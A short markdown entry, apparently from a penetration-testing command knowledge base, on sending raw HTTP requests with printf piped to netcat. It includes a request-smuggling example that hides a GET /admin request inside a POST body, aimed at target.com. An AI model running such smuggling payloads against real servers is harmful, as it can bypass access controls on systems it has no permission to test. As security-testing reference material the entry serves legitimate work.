---
data: 'printf "[raw http payload]" | nc [host] [port]'
tags:
  - http
  - raw
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 62d505d4-8aa5-4172-82c0-ecf4c847ec19
created_at: '2025-12-13T09:01:17.509Z'
updated_at: '2025-12-13T09:01:17.509Z'
verified: false
validated: true
submitted: true
---
# Netcat Send Raw HTTP

## Command

```bash
printf "[raw http payload]" | nc [host] [port]
```

## Description

Sends raw HTTP requests using netcat, ideal for crafting malformed requests in smuggling attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `host` | Target hostname | Yes |
| `port` | Target port (e.g., 80) | Yes |

## Examples

### Basic Usage

```bash
printf "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

### Advanced Usage

```bash
printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\n\r\nABCDE\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

## Expected Output

Server's HTTP response, potentially showing smuggling effects.

## Related

- [[procedures/Identify-Vulnerable-Node.js-Application]]
- [[procedures/Exploit-for-Cache-Poisoning]]
